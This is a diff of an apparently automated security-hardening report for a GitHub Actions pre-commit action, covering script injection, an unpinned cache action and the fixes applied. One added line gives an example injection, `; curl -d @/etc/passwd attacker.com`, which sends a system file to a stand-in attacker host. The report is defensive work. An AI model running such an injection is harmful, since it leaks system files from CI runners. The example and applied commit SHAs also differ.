@@ -16,7 +16,12 @@ Action **pre-commit--action/v3.0.1** was hardened automatically. 3 finding(s) we
 
 ### script-injection (severity: high)
 
-Sub-rule (a): The `run:` block on line 16 directly interpolates `${{ inputs.extra_args }}` into the shell command `pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}`. The Actions runner substitutes this expression before the shell parses the command, so any caller who supplies a crafted `extra_args` value (e.g. `; malicious-command`) can execute arbitrary shell commands on the runner.
+Sub-rule (a): The `run:` step directly interpolates `${{ inputs.extra_args }}` into the shell command string: `pre-commit run --show-diff-on-failure --color=always ${{ inputs.extra_args }}`. The GitHub Actions template engine substitutes the expression before the shell parses the command, allowing an attacker who controls the `extra_args` input to inject arbitrary shell commands (e.g., `; curl -d @/etc/passwd attacker.com`). Fix: pass the value via an `env:` variable and double-quote it in the script, e.g.:
+```yaml
+env:
+  EXTRA_ARGS: ${{ inputs.extra_args }}
+run: pre-commit run --show-diff-on-failure --color=always "$EXTRA_ARGS"
+```
 
 Locations:
 
@@ -24,11 +29,11 @@ Locations:
 
 ### unpinned-uses (severity: high)
 
-The composite action step `uses: actions/cache@v4` (line 11) references a mutable tag (`v4`) rather than a pinned 40-character commit SHA. If the `actions/cache` repository is compromised or the tag is moved, the action will silently execute attacker-controlled code. Pin to a full SHA, e.g. `actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4`.
+The composite action step uses `actions/cache@v4`, which is a mutable tag reference. If the tag is moved (e.g., by a supply-chain compromise of the `actions/cache` repository), the action will silently execute different code. Pin to a full 40-character commit SHA instead, e.g.: `actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4`.
 
 Locations:
 
-- `action.yml:11`
+- `action.yml:13`
 
 ### static-inline-injection (severity: high)
 
@@ -46,5 +51,6 @@ Locations:
 
 **Notes:**
 
-1. Pinned `actions/cache@v4` to full SHA `0057852bfaa89a56745cba8c7296529d2fc39830` (tag preserved as comment). 2. Fixed script injection for `inputs.extra_args` (both findings refer to the same expression): moved it to an `env:` block as `EXTRA_ARGS`, then used xargs-based quote-aware tokenization into a bash array before passing to `pre-commit run --show-diff-on-failure --color=always`. This correctly handles the list/args-style input without collapsing it into a single argument.
+1. Pinned `actions/cache@v4` to full SHA `0057852bfaa89a56745cba8c7296529d2fc39830` with `# v4` comment for readability.
+2. Moved `${{ inputs.extra_args }}` out of the `run:` shell string into an `env:` block as `EXTRA_ARGS`. Because `extra_args` is an argument-list input (defaults to `--all-files`), used the xargs-based array tokenization pattern (`printf '%s' "$EXTRA_ARGS" | xargs printf '%s\0'` with a null-delimited read loop) to correctly split the value into separate arguments while preserving quoted sub-arguments and preventing shell injection.
 
